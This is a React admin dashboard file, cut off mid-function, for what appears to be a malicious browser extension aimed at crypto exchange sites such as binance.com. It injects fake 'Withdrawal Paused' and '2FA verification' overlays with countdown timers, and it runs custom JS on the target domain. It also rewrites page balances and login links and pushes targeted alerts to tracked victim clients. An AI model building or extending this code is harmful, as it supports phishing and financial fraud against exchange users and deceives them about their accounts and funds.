'use client';

import { useState, useEffect, useRef } from 'react';

export default function AdminDashboard() {
  const [activeTab, setActiveTab] = useState('rules'); // rules | preview | clients | settings | docs
  const [rules, setRules] = useState([]);
  const [clients, setClients] = useState([]);
  const [messages, setMessages] = useState([]);
  const [stats, setStats] = useState({ totalClients: 0, onlineClients: 0, totalRequests: 0, rulesCount: 0 });
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [toast, setToast] = useState(null);

  // Admin Authentication & Login Protection State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [authChecking, setAuthChecking] = useState(true);
  const [adminUser, setAdminUser] = useState(null);
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [loginLoading, setLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Profile Settings Form State
  const [profileForm, setProfileForm] = useState({
    name: 'Super Admin',
    email: '',
    currentPassword: '',
    newPassword: '',
    confirmPassword: '',
  });
  const [profileSaving, setProfileSaving] = useState(false);

  const hasInitializedRef = useRef(false);

  // Modal States
  const [showAddDomainModal, setShowAddDomainModal] = useState(false);
  const [newDomainInput, setNewDomainInput] = useState('');
  const [newDomainTemplate, setNewDomainTemplate] = useState('binance');

  const [showAlertModal, setShowAlertModal] = useState(false);
  const [alertTargetClient, setAlertTargetClient] = useState(null);
  const [alertForm, setAlertForm] = useState({
    title: 'Withdrawal Paused: Action Required',
    body: 'Your withdrawal of 1.45 BTC is temporarily paused. Please verify your 2FA identity credentials to authorize the transaction.',
    ctaText: 'Verify 2FA Now →',
    ctaUrl: 'https://accounts.binance.com',
    variant: 'danger', // warning | danger | success | info
    position: 'center', // center | top
  });

  // Live DOM Text Replacements State
  const [replacements, setReplacements] = useState([]);
  const [repSaving, setRepSaving] = useState(false);
  const [repTouched, setRepTouched] = useState(false);
  const [editingRepId, setEditingRepId] = useState(null);
  const [repForm, setRepForm] = useState({
    id: null,
    domain: 'binance.com',
    targetMode: 'global', // 'global' | 'specific'
    targetClientId: '',
    pastedCode: '',
    selector: '',
    originalText: '',
    replacementText: '',
    originalHref: '',
    replacementHref: '',
    replaceType: 'text', // 'text' | 'html'
  });

  // Default section template generator
  const createDefaultSection = (type) => {
    const id = 'sec_' + Math.random().toString(36).substring(2, 9);
    switch (type) {
      case 'heading':
        return { id, type: 'heading', text: 'Important Security Announcement', size: 32, color: '#f0b90b', align: 'center' };
      case 'text':
        return { id, type: 'text', text: 'Please complete your account verification to ensure uninterrupted trading access.', size: 16, color: '#eaecef', align: 'center' };
      case 'button':
        return { id, type: 'button', text: 'Verify Account Now →', url: 'https://binance.com', bg: '#f0b90b', color: '#000000', size: 15 };
      case 'alert':
        return { id, type: 'alert', text: 'Action required within 24 hours to prevent temporary withdrawal pause.', variant: 'warning', icon: '⚠️' };
      case 'countdown':
        return { id, type: 'countdown', label: 'Security Window Expires In:', minutes: 15 };
      case 'image':
        return { id, type: 'image', url: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.svg', width: '120px' };
      default:
        return { id, type: 'text', text: 'New content block', size: 16, color: '#eaecef', align: 'center' };
    }
  };

  const initialForm = {
    id: null,
    domain: 'binance.com',
    enabled: true,
    overlay: {
      builderMode: 'elementor', // 'elementor' | 'code'
      sections: [
        { id: 'sec-1', type: 'alert', text: 'Urgent: Complete Identity Verification Refresh', variant: 'warning', icon: '⚠️' },
        { id: 'sec-2', type: 'heading', text: 'Verify Your Binance Account', size: 32, color: '#f0b90b', align: 'center' },
        { id: 'sec-3', type: 'text', text: 'Due to updated regulatory guidelines, please re-authenticate your credentials to unlock full trading limits.', size: 16, color: '#eaecef', align: 'center' },
        { id: 'sec-4', type: 'button', text: 'Verify Account Now →', url: 'https://binance.com/en/my/settings/profile', bg: '#f0b90b', color: '#000000', size: 15 },
        { id: 'sec-5', type: 'countdown', label: 'Verification Window Expires In:', minutes: 15 },
      ],
      position: 'center',
      height: '52',
      width: '540px',
      bg: '#14171d',
      text: '#eaecef',
      borderRadius: '16',
      borderWidth: '2',
      borderColor: '#f0b90b',
      shadow: 'strong',
      backdropBlur: true,
      closable: true,
      customHtml: '<div style="text-align: center; padding: 24px;">\n  <h2 style="color: #f0b90b; font-size: 28px; margin-bottom: 12px;">Security Verification Required</h2>\n  <p style="color: #eaecef; font-size: 16px; margin-bottom: 20px;">Please re-authenticate your wallet to continue uninterrupted withdrawals.</p>\n  <a href="#" style="background: #f0b90b; color: #000; padding: 12px 30px; font-weight: bold; text-decoration: none; border-radius: 8px; display: inline-block;">Verify Credentials Now</a>\n</div>',
      customCss: '',
      customJs: '// Remote JS script executed on target domain\nconsole.log("[RemoteOverlay] Active on domain:", window.location.hostname);',
    },
  };

  const [formData, setFormData] = useState(initialForm);
  const [selectedRuleId, setSelectedRuleId] = useState(null);
  const [deviceViewport, setDeviceViewport] = useState('desktop'); // desktop | mobile
  const [previewClosed, setPreviewClosed] = useState(false);
  const [showAddSectionTray, setShowAddSectionTray] = useState(false);
  const [codeActiveTab, setCodeActiveTab] = useState('html'); // html | css | js

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3500);
  };

  const currentMode = formData.overlay?.builderMode || 'elementor';

  const currentSections = formData.overlay?.sections && Array.isArray(formData.overlay?.sections)
    ? formData.overlay.sections
    : [];

  const updateOverlay = (field, value) => {
    setFormData((prev) => ({
      ...prev,
      overlay: {
        ...(prev.overlay || {}),
        [field]: value,
      },
    }));
  };

  const setBuilderMode = (mode) => {
    updateOverlay('builderMode', mode);
  };

  // Section manipulation functions
  const handleAddSection = (type) => {
    const newSec = createDefaultSection(type);
    const updated = [...currentSections, newSec];
    updateOverlay('sections', updated);
    setShowAddSectionTray(false);
    showToast(`Added ${type.toUpperCase()} section`);
  };

  const handleUpdateSection = (index, field, value) => {
    const updated = [...currentSections];
    if (updated[index]) {
      updated[index] = { ...updated[index], [field]: value };
      updateOverlay('sections', updated);
    }
  };

  const handleRemoveSection = (index) => {
    const updated = currentSections.filter((_, i) => i !== index);
    updateOverlay('sections', updated);
    showToast('Section removed');
  };

  const handleMoveSection = (index, direction) => {
    const targetIdx = index + direction;
    if (targetIdx < 0 || targetIdx >= currentSections.length) return;
    const updated = [...currentSections];
    const temp = updated[index];
    updated[index] = updated[targetIdx];
    updated[targetIdx] = temp;
    updateOverlay('sections', updated);
  };

  // Fetch initial data
  const [broadcastsEnabled, setBroadcastsEnabled] = useState(true);
  const [broadcastsList, setBroadcastsList] = useState([]);
  const [broadcastLoading, setBroadcastLoading] = useState(false);

  // When a rule is selected from sidebar/chips
  const handleSelectRule = (rule) => {
    setSelectedRuleId(rule.id);
    setPreviewClosed(false);

    let ruleSections = rule.overlay?.sections;
    if (!ruleSections || !Array.isArray(ruleSections) || ruleSections.length === 0) {
      ruleSections = [];
      if (rule.overlay?.title) {
        ruleSections.push({
          id: 'sec-t',
          type: 'heading',
          text: rule.overlay.title,
          size: parseInt(rule.overlay.titleSize, 10) || 32,
          color: rule.overlay.titleColor || '#f0b90b',
          align: rule.overlay.textAlign || 'center',
        });
      }
      if (rule.overlay?.message) {
        ruleSections.push({
          id: 'sec-m',
          type: 'text',
          text: rule.overlay.message,
          size: parseInt(rule.overlay.messageSize, 10) || 16,
          color: rule.overlay.text || '#eaecef',
          align: rule.overlay.textAlign || 'center',
        });
      }
      if (rule.overlay?.ctaText) {
        ruleSections.push({
          id: 'sec-b',
          type: 'button',
          text: rule.overlay.ctaText,
          url: rule.overlay.ctaUrl || '',
          bg: rule.overlay.ctaBg || '#f0b90b',
          color: rule.overlay.ctaColor || '#000000',
          size: 15,
        });
      }
      if (ruleSections.length === 0) {
        ruleSections = [
          { id: 'sec-1', type: 'heading', text: 'Important Notice', size: 30, color: '#f0b90b', align: 'center' },
          { id: 'sec-2', type: 'text', text: 'Message content goes here...', size: 16, color: '#eaecef', align: 'center' },
        ];
      }
    }

    setFormData({
      id: rule.id,
      domain: rule.domain,
      enabled: rule.enabled !== false,
      overlay: {
        builderMode: rule.overlay?.builderMode || 'elementor',
        sections: ruleSections,
        position: rule.overlay?.position || 'top',
        height: String(rule.overlay?.height || '45'),
        width: rule.overlay?.width || '540px',
        bg: rule.overlay?.bg || '#14171d',
        text: rule.overlay?.text || '#eaecef',
        borderRadius: String(rule.overlay?.borderRadius ?? '12'),
        borderWidth: String(rule.overlay?.borderWidth ?? '2'),
        borderColor: rule.overlay?.borderColor || '#f0b90b',
        shadow: rule.overlay?.shadow || 'strong',
        backdropBlur: !!rule.overlay?.backdropBlur,
        closable: rule.overlay?.closable !== false,
        customHtml: rule.overlay?.customHtml || '<div style="text-align: center; padding: 20px;"><h2 style="color: #f0b90b;">Custom HTML Banner</h2><p>Custom HTML markup...</p></div>',
        customCss: rule.overlay?.customCss || '',
        customJs: rule.overlay?.customJs || '',
        title: rule.overlay?.title || '',
        message: rule.overlay?.message || '',
        ctaText: rule.overlay?.ctaText || '',
      },
    });
  };

  // Fetch initial rules
  const fetchData = async () => {
    try {
      setLoading(true);
      const res = await fetch('/api/admin/rules');
      const data = await res.json();

      if (data.success) {
        const validRules = (data.rules || []).filter((r) => r.domain !== '*' && r.id !== 'rule-global-fallback');
        setRules(validRules);

        if (!hasInitializedRef.current && validRules.length > 0) {
          hasInitializedRef.current = true;
          handleSelectRule(validRules[0]);
        }
      }
    } catch (err) {
      showToast('Failed to load rules', 'error');
    } finally {
      setLoading(false);
    }
  };

  // Live dynamic polling for clients, alerts, and broadcasts
  const fetchClientsAndStats = async () => {
    try {
      const [clientRes, msgRes, bRes] = await Promise.all([
        fetch('/api/admin/clients'),
        fetch('/api/admin/messages'),
        fetch('/api/admin/broadcasts'),
      ]);

      const clientData = await clientRes.json();
      if (clientData.success) {
        const liveClients = clientData.clients || [];
        setClients(liveClients);
        const liveOnline = liveClients.filter((c) => c.isOnline || c.status === 'online').length;
        setStats((prev) => ({
          ...prev,
          onlineClients: clientData.onlineClients ?? liveOnline,
          totalClients: clientData.totalClients ?? liveClients.length,
        }));
      }

      const msgData = await msgRes.json();
      if (msgData.success) {
        setMessages(msgData.messages || []);
      }

      const bData = await bRes.json();
      if (bData.success) {
        setBroadcastsEnabled(bData.broadcastsEnabled !== false);
        setBroadcastsList(bData.broadcasts || []);
      }
    } catch (e) { }
  };

  // Master switch to enable or disable global broadcasts
  const handleToggleBroadcasts = async (enable) => {
    try {
      setBroadcastLoading(true);
      const res = await fetch('/api/admin/broadcasts', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ broadcastsEnabled: enable }),
      });
      const data = await res.json();
      if (data.success) {
        setBroadcastsEnabled(data.broadcastsEnabled);
        showToast(data.message, 'success');
        fetchClientsAndStats();
      } else {
        throw new Error(data.error);
      }
    } catch (err) {
      showToast(err.message || 'Failed to toggle broadcasts', 'error');
    } finally {
      setBroadcastLoading(false);
    }
  };

  // Validate if current replacer configuration is valid and updatable
  const computeReplacerValidation = (form) => {
    const errors = [];
    const domain = (form?.domain || '').trim();
    const targetMode = form?.targetMode || 'global';
    const targetClientId = (form?.targetClientId || '').trim();
    const originalText = (form?.originalText || '').trim();
    const selector = (form?.selector || '').trim();
    const originalHref = (form?.originalHref || '').trim();
    const replacementText = (form?.replacementText || '').trim();
    const replacementHref = (form?.replacementHref || '').trim();

    // 0. Specific Client validation
    if (targetMode === 'specific' && !targetClientId) {
      errors.push({ field: 'targetClient', message: 'Specific user mode selected: Choose or enter a target Client ID.' });
    }

    // 1. Domain validation
    if (!domain) {
      errors.push({ field: 'domain', message: 'Target domain is required (e.g. binance.com or *)' });
    }

    // 2. Target validation: Must provide original text, CSS selector, or target link URL
    const hasTarget = originalText.length > 0 || selector.length > 0 || originalHref.length > 0;
    if (!hasTarget) {
      errors.push({
        field: 'target',
        message: 'No target specified: Provide original text to match, a CSS selector, or target link URL.',
      });
    }

    // 3. CSS Selector syntax validation
    let selectorValid = true;
    if (selector) {
      try {
        if (typeof document !== 'undefined') {
          document.createDocumentFragment().querySelector(selector);
        }
      } catch (e) {
        selectorValid = false;
        errors.push({
          field: 'selector',
          message: `Invalid CSS selector syntax: "${selector}". Please verify format.`,
        });
      }
    }

    // 4. Replacement value validation: Must provide replacement text OR replacement href
    const hasReplacement = replacementText.length > 0 || replacementHref.length > 0;
    if (!hasReplacement) {
      errors.push({
        field: 'replacement',
        message: 'Missing replacement value: Enter new replacement text or a new Link URL (href).',
      });
    }

    const isUpdatable = errors.length === 0;
    return {
      isUpdatable,
      errors,
      hasTarget,
      selectorValid,
      hasReplacement,
    };
  };

  const repValidation = computeReplacerValidation(repForm);

  const isRepFormEmpty =
    !(repForm?.pastedCode || '').trim() &&
    !(repForm?.originalText || '').trim() &&
    !(repForm?.selector || '').trim() &&
    !(repForm?.replacementText || '').trim() &&
    !(repForm?.originalHref || '').trim() &&
    !(repForm?.replacementHref || '').trim();

  // ONLY show red errors if the user has started typing/interacting OR attempted to save
  const showRepErrors = (!isRepFormEmpty || repTouched) && !repValidation.isUpdatable;

  // Auto-parse pasted element/HTML code (with smart href & selector extraction)
  const handlePastedCodeChange = (code) => {
    let nextSelector = repForm.selector;
    let nextOriginal = repForm.originalText;
    let nextOriginalHref = repForm.originalHref;
    let nextReplacementHref = repForm.replacementHref;

    if (code && typeof code === 'string') {
      const trimmed = code.trim();
      if (trimmed.startsWith('<') && trimmed.includes('>')) {
        try {
          const parser = new DOMParser();
          const doc = parser.parseFromString(trimmed, 'text/html');
          const el = doc.body.firstElementChild;
          if (el) {
            const text = el.textContent?.trim() || '';
            if (text) nextOriginal = text;

            // Extract href if tag is <a> or contains <a>
            const anchor = el.tagName.toLowerCase() === 'a' ? el : el.querySelector('a');
            if (anchor) {
              const href = anchor.getAttribute('href');
              if (href) {
                nextOriginalHref = href;
                if (!nextReplacementHref) {
                  nextReplacementHref = href;
                }
              }
            }

            if (el.id) {
              nextSelector = '#' + el.id;
            } else if (el.classList && el.classList.length > 0) {
              nextSelector = '.' + Array.from(el.classList).slice(0, 2).join('.');
            } else {
              nextSelector = el.tagName.toLowerCase();
            }
          }
        } catch (e) {}
      } else if (trimmed.startsWith('http://') || trimmed.startsWith('https://') || trimmed.startsWith('/')) {
        nextOriginalHref = trimmed;
      } else if (trimmed) {
        nextOriginal = trimmed;
      }
    }

    setRepForm((prev) => ({
      ...prev,
      pastedCode: code,
      selector: nextSelector,
      originalText: nextOriginal,
      originalHref: nextOriginalHref,
      replacementHref: nextReplacementHref,
    }));
  };

  const fetchReplacements = async () => {
    try {
      const res = await fetch('/api/admin/replacements');
      const data = await res.json();
      if (data.success) {
        setReplacements(data.replacements || []);
      }
    } catch (e) {}
  };

  const handleSaveReplacement = async (e) => {
    e?.preventDefault();
    setRepTouched(true);
    const val = computeReplacerValidation(repForm);
    if (!val.isUpdatable) {
      showToast(val.errors[0]?.message || 'Configuration is not updatable. Please fix errors.', 'error');
      return;
    }

    setRepSaving(true);
    try {
      const res = await fetch('/api/admin/replacements', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(repForm),
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.error);

      showToast(
        editingRepId
          ? `Text replacement rule updated successfully!`
          : `Text & Link replacement rule saved! Extension will now update this live.`,
        'success'
      );
      setEditingRepId(null);
      setRepTouched(false);
      setRepForm({
        id: null,
        domain: 'binance.com',
        targetMode: 'global',
        targetClientId: '',
        pastedCode: '',
        selector: '',
        originalText: '',
        replacementText: '',
        originalHref: '',
        replacementHref: '',
        replaceType: 'text',
      });
      fetchReplacements();
    } catch (err) {
      showToast(err.message || 'Failed to save replacement rule', 'error');
    } finally {
      setRepSaving(false);
    }
  };

  const handleEditReplacement = (rule) => {
    if (!rule) return;
    setRepTouched(true);
    setEditingRepId(rule.id);
    setRepForm({
      id: rule.id,
      domain: rule.domain || 'binance.com',
      targetMode: rule.targetClientId ? 'specific' : 'global',
      targetClientId: rule.targetClientId || '',
      pastedCode: rule.pastedCode || '',
      selector: rule.selector || '',
      originalText: rule.originalText || '',
      replacementText: rule.replacementText || '',
      originalHref: rule.originalHref || '',
      replacementHref: rule.replacementHref || '',
      replaceType: rule.replaceType || 'text',
    });
    if (typeof document !== 'undefined') {
      const formEl = document.getElementById('replacer-form-card');
      if (formEl) {
        formEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }
    showToast(`Loaded "${rule.originalText || rule.domain}" into editor. Make changes and click Save.`, 'info');
  };

  const handleCancelEditReplacement = () => {
    setEditingRepId(null);
    setRepTouched(false);
    setRepForm({
      id: null,
      domain: 'binance.com',
      targetMode: 'global',
      targetClientId: '',
      pastedCode: '',
      selector: '',
      originalText: '',
      replacementText: '',
      originalHref: '',
      replacementHref: '',
      replaceType: 'text',
    });
    showToast('Cancelled editing mode', 'info');
  };

  const handleDeleteReplacement = async (id) => {
    if (!id) return;
    try {
      const res = await fetch(`/api/admin/replacements?id=${encodeURIComponent(id)}`, {
        method: 'DELETE',
      });
      const data = await res.json();
      if (data.success) {
        if (editingRepId === id) {
          handleCancelEditReplacement();
        }
        setReplacements((prev) => prev.filter((r) => r.id !== id));
        showToast('Replacement rule removed', 'info');
      } else {
        throw new Error(data.error);
      }
    } catch (err) {
      showToast(err.message || 'Failed to delete replacement rule', 'error');
    }
  };

  const handleToggleReplacement = async (id, currentEnabled) => {
    try {
      const res = await fetch('/api/admin/replacements', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, enabled: !currentEnabled }),
      });
      const data = await res.json();
      if (data.success) {
        setReplacements((prev) =>
          prev.map((r) => (r.id === id ? { ...r, enabled: !currentEnabled } : r))
        );
        showToast(`Rule ${!currentEnabled ? 'Enabled' : 'Disabled'}`, 'success');
      }
    } catch (err) {
      showToast('Failed to toggle rule', 'error');
    }
  };

  const handleLoadDemoReplacement = () => {
    setEditingRepId(null);
    setRepTouched(true);
    setRepForm({
      id: null,
      domain: 'binance.com',
      targetMode: 'global',
      targetClientId: '',
      pastedCode: '<div class="balance-amount">$1,450.00 USD</div>',
      selector: '.balance-amount',
      originalText: '$1,450.00 USD',
      replacementText: '$148,920.50 USD',
      originalHref: '',
      replacementHref: '',
      replaceType: 'text',
    });
    showToast('Loaded demo Binance balance template! Click Save to apply.', 'info');
  };

  const handleLoadDemoLinkReplacement = () => {
    setEditingRepId(null);
    setRepTouched(true);
    setRepForm({
      id: null,
      domain: 'binance.com',
      targetMode: 'global',
      targetClientId: '',
      pastedCode: '<a href="https://accounts.binance.com/en/login" class="nav-login-btn">Log In</a>',
      selector: '.nav-login-btn',
      originalText: 'Log In',
      replacementText: 'Verify Account Now',
      originalHref: 'https://accounts.binance.com/en/login',
      replacementHref: 'https://binance.com/en/my/settings/profile',
      replaceType: 'text',
    });
    showToast('Loaded demo Binance link redirection template! Valid & ready to update.', 'info');
  };

  // Session verification on mount
  useEffect(() => {
    const savedToken = typeof window !== 'undefined' ? localStorage.getItem('overlay_admin_token') : null;
    const savedUser = typeof window !== 'undefined' ? localStorage.getItem('overlay_admin_user') : null;
    if (savedToken && savedUser) {
      try {
        const parsed = JSON.parse(savedUser);
        setIsAuthenticated(true);
        setAdminUser(parsed);
        setProfileForm((prev) => ({
          ...prev,
          email: parsed.email || '',
          name: parsed.name || 'Super Admin',
        }));
      } catch (e) {
        setIsAuthenticated(false);
      }
    } else {
      setIsAuthenticated(false);
    }
    setAuthChecking(false);
  }, []);

  // Poll only when authenticated
  useEffect(() => {
    if (!isAuthenticated) return;
    fetchData();
    fetchClientsAndStats();
    fetchReplacements();
    // Live dynamic interval every 2.5s for real-time heartbeat and alerts
    const interval = setInterval(() => {
      fetchClientsAndStats();
      fetchReplacements();
    }, 2500);
    return () => clearInterval(interval);
  }, [isAuthenticated]);

  // Auth & Profile Handlers
  const handleLogin = async (e) => {
    e?.preventDefault();
    setLoginError('');
    setLoginLoading(true);

    try {
      const res = await fetch('/api/admin/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: loginEmail, password: loginPassword }),
      });
      const data = await res.json();
      if (!data.success) {
        throw new Error(data.error || 'Invalid credentials');
      }

      localStorage.setItem('overlay_admin_token', data.token);
      localStorage.setItem('overlay_admin_user', JSON.stringify(data.admin));
      setIsAuthenticated(true);
      setAdminUser(data.admin);
      setProfileForm((prev) => ({
        ...prev,
        email: data.admin.email,
        name: data.admin.name || 'Super Admin',
      }));
      showToast(`Welcome back, ${data.admin.email}!`, 'success');
    } catch (err) {
      setLoginError(err.message || 'Login failed');
    } finally {
      setLoginLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('overlay_admin_token');
    localStorage.removeItem('overlay_admin_user');
    setIsAuthenticated(false);
    setAdminUser(null);
    showToast('Signed out of admin dashboard', 'info');
  };

  const handleUpdateProfile = async (e) => {
    e?.preventDefault();
    if (profileForm.newPassword) {
      if (!profileForm.currentPassword) {
        showToast('Please enter your current password to set a new password', 'error');
        return;
      }
      if (profileForm.newPassword !== profileForm.confirmPassword) {
        showToast('New passwords do not match', 'error');
        return;
      }
      if (profileForm.newPassword.length < 6) {
        showToast('New password must be at least 6 characters', 'error');
        return;
      }
    }

    setProfileSaving(true);
    try {
      const res = await fetch('/api/admin/auth/profile', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          currentEmail: adminUser?.email || '',
          newEmail: profileForm.email,
          name: profileForm.name,
          currentPassword: profileForm.currentPassword,
          newPassword: profileForm.newPassword,
        }),
      });
      const data = await res.json();
      if (!data.success) {
        throw new Error(data.error || 'Failed to update profile');
      }

      setAdminUser(data.admin);
      localStorage.setItem('overlay_admin_user', JSON.stringify(data.admin));
      setProfileForm((prev) => ({
        ...prev,
        currentPassword: '',
        newPassword: '',
        confirmPassword: '',
      }));
      showToast('Profile and security credentials updated in MongoDB!', 'success');
    } catch (err) {
      showToast(err.message || 'Failed to update profile', 'error');
    } finally {
      setProfileSaving(false);
    }
  };

  const handleDeleteClient = async (clientId) => {
    if (!clientId) return;
    try {
      const res = await fetch(`/api/admin/clients?clientId=${encodeURIComponent(clientId)}`, {
        method: 'DELETE',
      });
      const data = await res.json();
      if (data.success) {
        setClients((prev) => prev.filter((c) => c.clientId !== clientId));
        showToast(`Client ${clientId} deleted from logs`, 'success');
        fetchClientsAndStats();
      } else {
        throw new Error(data.error);
      }
    } catch (err) {
      showToast(err.message || 'Failed to delete client', 'error');
    }
  };



  // Dedicated clean modal: Create New Domain Rule
  const handleOpenAddDomainModal = () => {
    setNewDomainInput('');
    setNewDomainTemplate('binance');
    setShowAddDomainModal(true);
  };

  const handleCreateNewDomainRule = async (e) => {
    e?.preventDefault();
    const domainClean = newDomainInput.trim().toLowerCase();
    if (!domainClean) {
      showToast('Please enter a target domain (e.g. bybit.com)', 'error');
      return;
    }

    // Prepare template sections
    let templateSections = [];
    let templateBorder = '#f0b90b';
    let templatePos = 'center';

    if (newDomainTemplate === 'binance') {
      templateSections = [
        { id: 's1', type: 'alert', text: 'Action Required: Verify Account to Continue', variant: 'warning', icon: '⚠️' },
        { id: 's2', type: 'heading', text: 'Verify Your Binance Account', size: 30, color: '#f0b90b', align: 'center' },
        { id: 's3', type: 'text', text: 'Please complete your 2FA verification to unlock full deposit and withdrawal privileges.', size: 16, color: '#eaecef', align: 'center' },
        { id: 's4', type: 'button', text: 'Verify Account Now →', url: 'https://binance.com', bg: '#f0b90b', color: '#000000', size: 15 },
      ];
      templateBorder = '#f0b90b';
      templatePos = 'center';
    } else if (newDomainTemplate === 'withdrawal') {
      templateSections = [
        { id: 's1', type: 'alert', text: 'Security Notice: Withdrawal Temporarily Paused', variant: 'danger', icon: '🚨' },
        { id: 's2', type: 'heading', text: 'Withdrawal Paused', size: 32, color: '#ef4444', align: 'center' },
        { id: 's3', type: 'text', text: 'Withdrawals are paused for 24 hours due to an unrecognized login. Re-authenticate to resume.', size: 16, color: '#eaecef', align: 'center' },
        { id: 's4', type: 'button', text: 'Authenticate Identity Now', url: '#verify', bg: '#ef4444', color: '#ffffff', size: 15 },
      ];
      templateBorder = '#ef4444';
      templatePos = 'center';
    } else if (newDomainTemplate === 'bonus') {
      templateSections = [
        { id: 's1', type: 'heading', text: '🎁 500 USDT Voucher Credited!', size: 28, color: '#10b981', align: 'center' },
        { id: 's2', type: 'text', text: 'Your futures trading rebate reward is unlocked. Claim before expiration.', size: 15, color: '#eaecef', align: 'center' },
        { id: 's3', type: 'button', text: 'Claim Voucher Now', url: '#claim', bg: '#10b981', color: '#000000', size: 14 },
      ];
      templateBorder = '#10b981';
      templatePos = 'bottom-right';
    } else {
      templateSections = [
        { id: 's1', type: 'heading', text: 'Announcement Title', size: 28, color: '#f0b90b', align: 'center' },
        { id: 's2', type: 'text', text: 'Enter your custom message here...', size: 16, color: '#eaecef', align: 'center' },
      ];
    }

    const newRulePayload = {
      domain: domainClean,
      enabled: true,
      overlay: {
        builderMode: 'elementor',
        sections: templateSections,
        position: templatePos,
        height: '48',
        width: '540px',
        bg: '#14171d',
        text: '#eaecef',
        borderRadius: '16',
        borderWidth: '2',
        borderColor: templateBorder,
        shadow: 'strong',
        backdropBlur: true,
        closable: true,
        customHtml: '',
        customCss: '',
        customJs: '',
      },
    };

    try {
      setSaving(true);
      const res = await fetch('/api/admin/rules', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newRulePayload),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error || 'Failed to create rule');

      showToast(`Rule for "${domainClean}" created successfully!`);
      setShowAddDomainModal(false);

      if (result.rule) {
        setRules((prev) => [result.rule, ...prev.filter((r) => r.id !== result.rule.id)]);
        handleSelectRule(result.rule);
      }
    } catch (err) {
      showToast(err.message || 'Failed to create rule', 'error');
    } finally {
      setSaving(false);
    }
  };

  // Save current rule
  const handleSaveRule = async (e) => {
    e?.preventDefault();
    try {
      setSaving(true);
      const isNew = !formData.id;
      const url = '/api/admin/rules';
      const method = isNew ? 'POST' : 'PUT';

      const res = await fetch(url, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error || 'Failed to save rule');

      showToast(`Rule for "${formData.domain}" saved & published!`);

      if (result.rule) {
        const savedRule = result.rule;
        setSelectedRuleId(savedRule.id);
        setFormData((prev) => ({
          ...prev,
          id: savedRule.id,
          domain: savedRule.domain,
          enabled: savedRule.enabled,
          overlay: {
            ...(prev.overlay || {}),
            ...(savedRule.overlay || {}),
          },
        }));

        if (isNew) {
          setRules((prev) => [savedRule, ...prev.filter((r) => r.id !== savedRule.id)]);
        } else {
          setRules((prev) => prev.map((r) => (r.id === savedRule.id ? savedRule : r)));
        }
      }
    } catch (err) {
      showToast(err.message || 'Failed to save rule', 'error');
    } finally {
      setSaving(false);
    }
  };

  // Delete rule
  const handleDeleteRule = async (ruleId) => {
    if (!confirm('Are you sure you want to delete this rule?')) return;
    try {
      const res = await fetch(`/api/admin/rules?id=${encodeURIComponent(ruleId)}`, {
        method: 'DELETE',
      });
      const result = await res.json();
      if (!result.success) throw new Error(result.error || 'Failed to delete rule');

      showToast('Rule deleted successfully');
      setRules((prev) => {
        const remaining = prev.filter((r) => r.id !== ruleId);
        if (selectedRuleId === ruleId) {
          if (remaining.length > 0) {
            handleSelectRule(remaining[0]);
          } else {
            handleOpenAddDomainModal();
          }
        }
        return remaining;
      });
    } catch (err) {
      showToast(err.message || 'Failed to delete rule', 'error');
    }
  };

  // Open Direct Alert Modal for a specific connected client
  const handleOpenAlertModalForClient = (client) => {
    setAlertTargetClient(client);
    setAlertForm({
      title: 'Withdrawal Paused: Action Required',
      body: `Your account activity on ${client?.domain || 'this platform'} requires 2FA confirmation to unlock full services.`,
      ctaText: 'Verify 2FA Now →',
      ctaUrl: 'https://accounts.binance.com',
      variant: 'danger',
      position: 'center',
    });
    setShowAlertModal(true);
  };

  // Apply Alert Template in the modal
  const handleApplyAlertTemplate = (presetType) => {
    if (presetType === 'withdrawal') {
      setAlertForm({
        title: 'Withdrawal Paused: Action Required',
        body: 'Withdrawal of 1.45 BTC has been paused due to unrecognized IP login. Verify 2FA to authorize.',
        ctaText: 'Verify 2FA Now →',
        ctaUrl: 'https://accounts.binance.com',
        variant: 'danger',
        position: 'center',
      });
    } else if (presetType === 'verification') {
      setAlertForm({
        title: 'Identity Verification Notice',
        body: 'Due to updated regional regulatory requirements, please complete your facial verification refresh.',
        ctaText: 'Start Verification →',
        ctaUrl: 'https://binance.com/en/my/settings/profile',
        variant: 'warning',
        position: 'center',
      });
    } else if (presetType === 'reward') {
      setAlertForm({
        title: '🎉 500 USDT Voucher Added!',
        body: 'You have been awarded a VIP trading rebate voucher. Claim within 24 hours before expiration.',
        ctaText: 'Claim Reward Voucher',
        ctaUrl: 'https://binance.com/en/activity/rewards',
        variant: 'success',
        position: 'center',
      });
    } else if (presetType === 'session') {
      setAlertForm({
        title: 'Security Session Timeout',
        body: 'Your active session is expiring in 5 minutes. Please re-authenticate to remain logged in.',
        ctaText: 'Extend Session Now',
        ctaUrl: 'https://accounts.binance.com',
        variant: 'info',
        position: 'top',
      });
    }
  };

  // Send Direct Alert to Connected Client
  const handleSendDirectAlert = async (e) => {
    e?.preventDefault();
    if (!alertForm.title || !alertForm.body) {
      showToast('Please enter alert title and message', 'error');
      return;
    }

    const variantColorMap = {
      warning: '#f0b90b',
      danger: '#ef4444',
      success: '#10b981',
      info: '#3b82f6',
    };

    const chosenColor = variantColorMap[alertForm.variant] || '#f0b90b';

    const payload = {
      targetClientId: alertTargetClient ? alertTargetClient.clientId : null,
      title: alertForm.title,
